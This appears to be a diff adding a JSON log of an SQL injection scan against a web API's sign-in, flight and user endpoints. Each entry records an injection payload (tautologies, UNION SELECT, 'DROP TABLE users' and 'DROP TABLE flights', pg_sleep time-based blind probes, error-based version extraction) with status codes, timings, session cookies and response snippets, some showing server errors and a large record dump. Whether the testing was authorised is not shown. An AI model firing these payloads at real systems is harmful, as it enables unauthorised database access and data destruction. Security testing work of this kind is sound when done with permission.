@@ -1,0 +1,463 @@
+[
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "' OR '1'='1",
+    "status": 400,
+    "response_length": 95,
+    "elapsed_time": 0.20294547080993652,
+    "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+    "headers": {
+      "Content-Length": "95",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:00 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+      "Set-Cookie": "sails.sid=s%3Aun8_TqWxUbJI11wCkiCTuodg1zvbnlBy.H8GHrdlXuEP8h7JppnqhTN0GTkTCSuS5qFXM3TYBbuc; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "invalidPhoneNumber"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "' OR 1=1--",
+    "status": 400,
+    "response_length": 95,
+    "elapsed_time": 0.1363070011138916,
+    "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+    "headers": {
+      "Content-Length": "95",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:00 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+      "Set-Cookie": "sails.sid=s%3AvNc32UPyw5yhc_5EONQQcguGlBezBEHb.Tjm1QecsuUEDNWcIUnRiCrhWzJK8H4I90cAnE%2F%2Bkxls; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "invalidPhoneNumber"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "' OR 'x'='x",
+    "status": 400,
+    "response_length": 95,
+    "elapsed_time": 0.1198580265045166,
+    "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+    "headers": {
+      "Content-Length": "95",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:00 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+      "Set-Cookie": "sails.sid=s%3A6m00XJC0GsL0P-PSjWqPAgY7hDP7sgye.VhjfMHvZw0vYTHeRsBUQJNc1eFseazOrO%2Bj%2F1IzSLgU; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "invalidPhoneNumber"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "') OR ('1'='1",
+    "status": 400,
+    "response_length": 95,
+    "elapsed_time": 0.13091111183166504,
+    "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+    "headers": {
+      "Content-Length": "95",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:00 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+      "Set-Cookie": "sails.sid=s%3A-1U5677TaG-kzau4wS3CYYWZV7dIMCvm.3Gihui%2FRwhO%2FtigooJSnBAq2ieYbThIeA2dXBw3yx1g; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "invalidPhoneNumber"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "' UNION SELECT NULL--",
+    "status": 400,
+    "response_length": 95,
+    "elapsed_time": 0.11993122100830078,
+    "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+    "headers": {
+      "Content-Length": "95",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:00 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+      "Set-Cookie": "sails.sid=s%3AyUjQv1vAn8qmZRxoX_HcomqPUHWsipGa.EqUhaB8gsAS0VpzwIAYULw43SBGygh55%2FF7afn18qgE; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "invalidPhoneNumber"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/completeSignIn",
+    "method": "POST",
+    "param": "challengeCode",
+    "payload": "' OR '1'='1",
+    "status": 400,
+    "response_length": 249,
+    "elapsed_time": 0.11839580535888672,
+    "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"challengeCode\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v1/auth/complete",
+    "headers": {
+      "Content-Length": "250",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:00 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"fa-1VeEjtFQyNEqcoiHelbhTfpOtvw\"",
+      "Set-Cookie": "sails.sid=s%3A_qtnxOUhX5HdNUUaJjaH9zIri9h4LHmn.JZPsBcGkgXS3i6464ZwUY%2FeU8bbRKPSMAlejxFawuuQ; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "error"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/completeSignIn",
+    "method": "POST",
+    "param": "challengeCode",
+    "payload": "' OR 1=1--",
+    "status": 400,
+    "response_length": 249,
+    "elapsed_time": 0.11335611343383789,
+    "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"challengeCode\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v1/auth/complete",
+    "headers": {
+      "Content-Length": "250",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:00 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"fa-1VeEjtFQyNEqcoiHelbhTfpOtvw\"",
+      "Set-Cookie": "sails.sid=s%3ABDyQ9IS2igpBDZB3Tdi2p810u-UOlzBH.nQRt1rv3v1mw8KAWayputrfDc19tFts7swqmPbEqNEU; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "error"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/completeSignIn",
+    "method": "POST",
+    "param": "challengeCode",
+    "payload": "' OR 'x'='x",
+    "status": 400,
+    "response_length": 249,
+    "elapsed_time": 0.1076819896697998,
+    "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"challengeCode\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v1/auth/complete",
+    "headers": {
+      "Content-Length": "250",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:01 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"fa-1VeEjtFQyNEqcoiHelbhTfpOtvw\"",
+      "Set-Cookie": "sails.sid=s%3A1ft-IH_2XXwnorIJZo7E_1EH1A4FDWui.gO45kORKO6PYcK7HGD%2BPnXZXztomVam%2F3vQmeq8w%2Fxw; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "error"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/completeSignIn",
+    "method": "POST",
+    "param": "challengeCode",
+    "payload": "') OR ('1'='1",
+    "status": 400,
+    "response_length": 249,
+    "elapsed_time": 0.12958884239196777,
+    "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"challengeCode\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v1/auth/complete",
+    "headers": {
+      "Content-Length": "250",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:01 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"fa-1VeEjtFQyNEqcoiHelbhTfpOtvw\"",
+      "Set-Cookie": "sails.sid=s%3AIbh8mOhOpR55m_7qPddBD5iCfzuY1fCZ.qzHGjI06yNay5tkBGNb0sYFBs6S001Q732F%2FraP7Wxs; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "error"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/completeSignIn",
+    "method": "POST",
+    "param": "challengeCode",
+    "payload": "' UNION SELECT NULL--",
+    "status": 400,
+    "response_length": 249,
+    "elapsed_time": 0.11035990715026855,
+    "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"challengeCode\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v1/auth/complete",
+    "headers": {
+      "Content-Length": "250",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:01 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"fa-1VeEjtFQyNEqcoiHelbhTfpOtvw\"",
+      "Set-Cookie": "sails.sid=s%3AYWH0aZOVCpfXIjNFcFSwu6wsMhcNIaWe.jeMUFWWBhkaWOMu2%2BlC2YahKd%2FfuXphYDAk%2Feg8kWTU; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "error"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/completeSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "' OR '1'='1",
+    "status": 500,
+    "response_length": 21,
+    "elapsed_time": 0.11872506141662598,
+    "response_snippet": "Internal Server Error",
+    "headers": {
+      "Content-Length": "21",
+      "Content-Type": "text/plain; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:01 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"15-/6VXivhc2MKdLfIkLcUE47K6aH0\"",
+      "Set-Cookie": "sails.sid=s%3ATrOyGPSx2aOJVAPs33E7I7KcldVm9Cmj.F4nPcwpIuIzOG8p0MKDQ80IhRYnDKlYmOxq1cYvpy5U; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "serverError"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/completeSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "' OR 1=1--",
+    "status": 500,
+    "response_length": 21,
+    "elapsed_time": 0.11440491676330566,
+    "response_snippet": "Internal Server Error",
+    "headers": {
+      "Content-Length": "21",
+      "Content-Type": "text/plain; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:01 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"15-/6VXivhc2MKdLfIkLcUE47K6aH0\"",
+      "Set-Cookie": "sails.sid=s%3AZCOBDf01kijvl8cmJNGdrl7H83hDV1Bu.ufxe722qvno3b6bqR3IDWGzovjfehY%2FKW4zn%2BH22%2Fmg; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "serverError"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/completeSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "' OR 'x'='x",
+    "status": 500,
+    "response_length": 21,
+    "elapsed_time": 0.11800718307495117,
+    "response_snippet": "Internal Server Error",
+    "headers": {
+      "Content-Length": "21",
+      "Content-Type": "text/plain; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:01 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"15-/6VXivhc2MKdLfIkLcUE47K6aH0\"",
+      "Set-Cookie": "sails.sid=s%3AdwQD-a2CP9WT5EbLyQ9mMhN5_AVbJxyF.3Y321La%2FsPv3wBHq%2B8EakaYj34yNm%2BbK6C0CmbQi%2FPw; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "serverError"
+    }
+  },
+  {
+    "endpoint": "/v1/flight",
+    "method": "GET",
+    "param": "id",
+    "payload": "1' OR '1'='1",
+    "status": 200,
+    "response_length": 296185,
+    "elapsed_time": 1.6513276100158691,
+    "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762308469682,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-0",
+    "headers": {
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:03 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "Content-Encoding": "gzip",
+      "ETag": "W/\"484fe-8K2AMxY7kBU6zABpK7Lqxm7JXZg\"",
+      "Set-Cookie": "sails.sid=s%3At7QbGzfy2p2wVHga09FFIweftv3a_O3_.awXiW341GPRG0KOUiEOgnwL4%2BS9y5MoR68xD5jgpclk; Path=/; HttpOnly",
+      "Transfer-Encoding": "chunked",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "success"
+    }
+  },
+  {
+    "endpoint": "/v1/flight",
+    "method": "GET",
+    "param": "id",
+    "payload": "999999' UNION SELECT NULL--",
+    "status": 200,
+    "response_length": 296185,
+    "elapsed_time": 1.9582622051239014,
+    "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762308469682,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-0",
+    "headers": {
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:05 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "Content-Encoding": "gzip",
+      "ETag": "W/\"484fe-8K2AMxY7kBU6zABpK7Lqxm7JXZg\"",
+      "Set-Cookie": "sails.sid=s%3AVkAnTLDDfvco_noPLHMje2zGxzUwX1Y-.gQplsN1NN3NiLul1qTHfJOwt7rnaMsXK%2FeNJEhJU%2BzM; Path=/; HttpOnly",
+      "Transfer-Encoding": "chunked",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "success"
+    }
+  },
+  {
+    "endpoint": "/v1/flight",
+    "method": "GET",
+    "param": "id",
+    "payload": "1; DROP TABLE flights--",
+    "status": 200,
+    "response_length": 296185,
+    "elapsed_time": 1.8992249965667725,
+    "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762308469682,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-0",
+    "headers": {
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:07 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "Content-Encoding": "gzip",
+      "ETag": "W/\"484fe-8K2AMxY7kBU6zABpK7Lqxm7JXZg\"",
+      "Set-Cookie": "sails.sid=s%3A1Bm8PG8svLoN2rX2da0I2ZW5g6b3wleg.zcT9RYBHzeen0znRQX%2Bkym%2B4tYgaXk7AnfyIlU4YTPs; Path=/; HttpOnly",
+      "Transfer-Encoding": "chunked",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "success"
+    }
+  },
+  {
+    "endpoint": "/v1/flight",
+    "method": "GET",
+    "param": "search",
+    "payload": "' OR '1'='1",
+    "status": 200,
+    "elapsed_time": 1.449779987335205
+  },
+  {
+    "endpoint": "/v1/flight",
+    "method": "GET",
+    "param": "search",
+    "payload": "1; SELECT pg_sleep(5)--",
+    "status": 200,
+    "elapsed_time": 1.75278639793396
+  },
+  {
+    "endpoint": "/v1/user/20254' OR '1'='1",
+    "method": "GET",
+    "param": "userId",
+    "payload": "20254' OR '1'='1",
+    "status": 404,
+    "response_length": 9,
+    "elapsed_time": 0.16219067573547363,
+    "response_snippet": "Not Found",
+    "headers": {
+      "Content-Length": "9",
+      "Content-Type": "text/plain; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:10 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"9-0gXL1ngzMqISxa6S1zx3F4wtLyg\"",
+      "Set-Cookie": "sails.sid=s%3AxZYriU__nNBTcdOSQrYrd331JSWRKYQT.cxKPlECmh%2FJm%2FBpHKQo9z3lSNg5cdDZkSVdya61w5e0; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding"
+    }
+  },
+  {
+    "endpoint": "/v1/user/20254; DROP TABLE users--",
+    "method": "GET",
+    "param": "userId",
+    "payload": "20254; DROP TABLE users--",
+    "status": 404,
+    "response_length": 9,
+    "elapsed_time": 0.1267232894897461,
+    "response_snippet": "Not Found",
+    "headers": {
+      "Content-Length": "9",
+      "Content-Type": "text/plain; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:10 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"9-0gXL1ngzMqISxa6S1zx3F4wtLyg\"",
+      "Set-Cookie": "sails.sid=s%3ACThet2FTX4--_a7urqii9IDd5jqa9MfW.JWqk00w0ORFj8EV%2BNpoAhNxe0ixCLORYO6KY5QWpfdw; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "test_type": "time-based-blind",
+    "payload": "+13035234453",
+    "status": 200,
+    "elapsed_time": 0.659409761428833,
+    "anomaly": false
+  },
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "test_type": "time-based-blind",
+    "payload": "+13035234453'; SELECT pg_sleep(5)--",
+    "status": 400,
+    "elapsed_time": 0.12534332275390625,
+    "anomaly": false
+  },
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "test_type": "time-based-blind",
+    "payload": "+13035234453' AND (SELECT 1 FROM pg_sleep(3))--",
+    "status": 400,
+    "elapsed_time": 0.11313199996948242,
+    "anomaly": false
+  },
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "' AND 1=CONVERT(int, (SELECT @@version))--",
+    "status": 400,
+    "response_length": 95,
+    "elapsed_time": 0.1135721206665039,
+    "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+    "headers": {
+      "Content-Length": "95",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:11 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+      "Set-Cookie": "sails.sid=s%3AJhg3-2jO4BXPI7j3qAURTA7WoZFCVvpi.1aNZl3ACJHqtKcMH1TutnVTVLId9I67vVFtopTT2Z2Y; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "invalidPhoneNumber"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "' AND extractvalue(1, concat(0x7e, version()))--",
+    "status": 400,
+    "response_length": 95,
+    "elapsed_time": 0.11610579490661621,
+    "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+    "headers": {
+      "Content-Length": "95",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:11 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+      "Set-Cookie": "sails.sid=s%3AMgNCzT5YqbqCJ2IjQ-xIwqlBY36itLUT.xBgGG8ZcWLEkhgOaXqJyhwXycFh1oYGi%2BSkYLUFr4N8; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "invalidPhoneNumber"
+    }
+  },
+  {
+    "endpoint": "/v1/auth/initiateSignIn",
+    "method": "POST",
+    "param": "phoneNumber",
+    "payload": "' AND 1=(SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
+    "status": 400,
+    "response_length": 95,
+    "elapsed_time": 0.13128447532653809,
+    "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+    "headers": {
+      "Content-Length": "95",
+      "Content-Type": "application/json; charset=utf-8",
+      "Date": "Wed, 05 Nov 2025 02:08:11 GMT",
+      "Access-Control-Allow-Origin": "*",
+      "ETag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+      "Set-Cookie": "sails.sid=s%3AQs0ZHe54IdlzoMJwgB3rc1DLKEPktkqW.%2BR86V3dhN5v4luRgQb0bo11VZrnCdnykXqzFzb5CT%2B4; Path=/; HttpOnly",
+      "Vary": "Accept-Encoding",
+      "X-Exit": "invalidPhoneNumber"
+    }
+  }
+]
